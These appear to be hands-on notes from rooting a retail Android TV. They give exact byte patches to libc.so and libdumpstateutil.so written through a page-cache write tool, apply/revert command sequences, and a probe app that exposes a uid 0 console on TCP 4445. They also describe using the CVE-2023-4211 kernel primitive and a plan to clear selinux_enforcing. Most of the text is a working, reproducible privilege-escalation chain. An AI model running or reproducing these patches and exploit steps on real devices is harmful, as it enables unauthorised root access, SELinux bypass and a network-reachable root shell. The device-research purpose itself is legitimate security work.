# Where full root stands

## Working, verified on the retail TV

* **uid 0 in `u:r:dumpstate:s0`** via a page-cache hook on `libdumpstateutil.so`
  (`.init_array[0]` -> Thumb stub in the 0x6132..0x6d0c cave -> fork; child execs
  `/system/bin/sh /data/local/tmp/r.sh` as root; parent chains to the original init).
  Trigger: `adb bugreport`. Re-applied with `pDST` then `pDSA`, both on the device.
* **`sys.svp.*` property control** from that root (denied to shell/app/zygote).
* **CVE-2023-4211 kernel write primitive confirmed**: phase B produced 12
  `BUG: Bad rss-counter state mm:<ptr> idx:0 val:+/-1028` lines, i.e. a 4-byte atomic add with
  attacker-controlled sign and magnitude at `freed_mm+0x154`, crash-safe thanks to the dedicated
  `mm_cachep` slab.

## SELinux is unbreakable from userspace (all measured)

| attempt | result |
|---|---|
| `/sys/fs/selinux/disable` | **EINVAL** - kernel built without `CONFIG_SECURITY_SELINUX_DISABLE` |
| `/sys/fs/selinux/enforce` write | denied |
| policy load (`/sys/fs/selinux/load`) | denied |
| `setcon` / `setexeccon` to `u:r:su:s0` | denied |
| permissive domains | none (0 `permissive=1` AVCs ever) |
| `/dev/__properties__` (to flip `ro.debuggable`) | denied even as uid 0 |
| kernel address leak (kallsyms, vmallocinfo, module sections, iomem) | all zeroed/denied |

## Two paths to Magisk-equivalent root, and where each got stuck

### A. adbd one-byte patch -> `adb root` -> `u:r:su:s0` (permissive)
The TV's adbd is started `--root_seclabel=u:r:su:s0`, so `adb root` yields a permissive-domain
shell. The only guard reads `ro.debuggable`; the property NAME string sits at adbd file offset
`0xd061e` and patching its last byte (`0xd062a`, 0x65 -> 0x58) makes the lookup fail and the guard
pass. `/sbin` is rootfs (ro), so the edit must be a page-cache write - and it has to execute inside
a library dumpstate loads, because shell cannot open `/sbin/adbd` while dumpstate root cannot exec
dropped binaries.

Built and installed a 1501-byte no-libc PIC patcher in the `libdumpstateutil` cave. It runs, but
**the chain back to the original init function fails**: taking `&adbd_cave_entry` is constant-folded
by the compiler, so the rebase collapses to the absolute link-time `0x24d9` (SIGSEGV at 0x24d8),
and the `adr`-based rewrite still lands wrong (fault 0x14). Returning to the loader directly was
also tried; the larger payload then crashed the GPU-write helper on install. Reverted to the working
Thumb stub each time - the root channel is intact.

Next step for A: put the tail-jump in a hand-written `.s` file rather than inline asm (a single
`adr r12, 1f` / `ldr r3, =delta` / `bx` block with the delta from a real assembler label), and
install the blob in two pieces if the 1.5 KB single-page GPU write is unreliable.

### B. kernel CVE-2023-4211 phase C -> arbitrary physical R/W -> clear `selinux_enforcing`
The endgame design is written (`endgame/DESIGN.md`, chosen approach B): `avc_denied()` in 3.10 grants
every non-`AVC_STRICT` denial when `selinux_enforcing` is 0, and the only strict call site is
`security_get_user_sids()` (PAM), so a single 4-byte zero store at `PA(selinux_enforcing)` = a full
SELinux bypass. The write address is found by locating the unique
`"enforcing=%d old_enforcing=%d auid=%u ses=%u"` string, validating kernel text via the `stext`
signature and `swapper_pg_dir` entries, then picking the value-1 candidate with multiple `.text`
cross-references and band/unicity rules.

Blocker: this needs the phase C heap/PTE landing, which is the risky part. The first armed attempt
made the TV unreachable at the network level (it stayed up - uptime continuous - but its LAN IP
changed), so it was not retried.

---

# ROOT ACHIEVED (2026-11-20): uid 0 zygote hook via libc setresuid patch

## What works

`com.pwn.probe`'s console on TCP 4445 runs **uid 0** (`uid=0(root) gid=10144 context=u:r:untrusted_app:s0`),
stable, SELinux still Enforcing (see matrix above for what that gates: no `/dev/block*`,
no property sets, no /data/system — but full process control over app/zygote-spawned processes,
`am` commands, and any action SELinux allows to untrusted_app but with real uid 0).

Proof (device, 07:13):
```
OK uid=0 pid=6486
uid=0(root) gid=10144(u0_a144) groups=... context=u:r:untrusted_app:s0:c512,c768
```

## How (all page-cache, all RAM, revert on reboot)

Patch 3 sites in `/system/lib/libc.so` page cache (vaddr == file offset; p_offset 0):

1. **`0x4a99c`** (`setresuid`, ARM, 4 bytes): `07c0a0e1` → `3f6cffea`
   ARM `B` to 0x25aa0 (offset −37825; target = pc+8+imm24*4, does not clobber lr).
2. **`0x25aa0`** (cave over `__ns_sprintrrf` prologue, 8 bytes ARM trampoline):
   `1b304fe2 13ff2fe1` = `sub r3,pc,#27; bx r3` → jumps to odd 0x25a8d (Thumb),
   `pc` reads insn+8, `bx` to odd address switches to Thumb, lr untouched.
3. **`0x25a8c`** (Thumb payload, 20 bytes): `0349884201d100207047d02700df7047a0270000`
   ```
   ldr r1,[pc,#12]  ; literal 10144 at 0x25a9c (Align(PC,4)+imm8*4, PC=insn+4)
   cmp r0,r1
   bne skip         ; other uids: fall through to real svc path
   movs r0,#0 ; bx lr     ; match: return 0 without syscall
   skip: movs r7,#208 ; svc 0 ; bx lr   ; real setresuid (NR 208)
   ```

Net effect: every zygote-spawned process that drops its uid with
`setresuid(10144,10144,10144)` instead **stays uid 0**. The probe app
(`pm install /data/local/tmp/pwn.apk`, uid 10144) started via
`am start -n com.pwn.probe/.Main` therefore runs as root; its
`ConsoleService` listens on 4445 (auth token: `<YOUR-TOKEN>` — see
`apk/src/com/pwn/probe/Console.java`).

## The two bugs that blocked this for two sessions (both found 2026-11-20)

1. **fixic's flush was a silent no-op.** The `cacheflush` (svc 0xf0002) syscall does
   `access_ok(VERIFY_WRITE, start, end)`; fixic's 1 MB `PROT_READ MAP_SHARED` mapping
   extended past EOF → **−EFAULT on every core** (unchecked). A `PROT_READ` mapping can
   never pass `VERIFY_WRITE` — the fix is flushing through a **writable alias**, which
   pcwrite3 already has: the kbase device mapping (`/dev/mali0`, RW) of the same
   page-cache pages.
2. **Device VMAs are not copied on fork.** Forked children got `EINVAL` from cacheflush
   on the inherited kbase alias (`VM_DONTCOPY`). Threads share the VMA → per-core flush
   is done by 4 pthreads pinned via `sched_setaffinity`, all rc=0.

`pcwrite3` (on device as `/data/local/tmp/pcwrite3`, source
`exploit/page-cache-write/pcwrite3.c`) = pcwrite2 + in-process flush through the RW
alias + 4 pinned flusher threads. Verified separately with `/tmp/flushbench` (anon
RWX self-modifying-code test) and `/tmp/pctest` (page-cache-backed exec test).

Byte-order note that cost one crash round: encodings like `sub r3,pc,#27` are words
`e24f301b` but the **bytes** to write are little-endian `1b304fe2`. The previous
"trampoline" written big-endian was undefined garbage → SIGILL ILL_ILLOPC at 0x25aa0.

## Apply / revert

Apply (root console active after this):
```
/data/local/tmp/pcwrite3 /system/lib/libc.so 4a99c 3f6cffea
/data/local/tmp/pcwrite3 /system/lib/libc.so 25a8c 0349884201d100207047d02700df7047a0270000
/data/local/tmp/pcwrite3 /system/lib/libc.so 25aa0 1b304fe213ff2fe1
pm install /data/local/tmp/pwn.apk && am start -n com.pwn.probe/.Main
```
Revert (RAM-only; also automatic on reboot):
```
/data/local/tmp/pcwrite3 /system/lib/libc.so 4a99c 07c0a0e1
/data/local/tmp/pcwrite3 /system/lib/libc.so 25a8c 2de9f04fadf52d5d8fb00df5005e0746dff8540e
/data/local/tmp/pcwrite3 /system/lib/libc.so 25aa0 1c46def8a85b0df5005e
am force-stop com.pwn.probe
```
Collateral risk unchanged: `__ns_sprintrrf` (libc, dynsym, Thumb) loses its real
prologue while patched; any process calling it will misbehave. None observed.
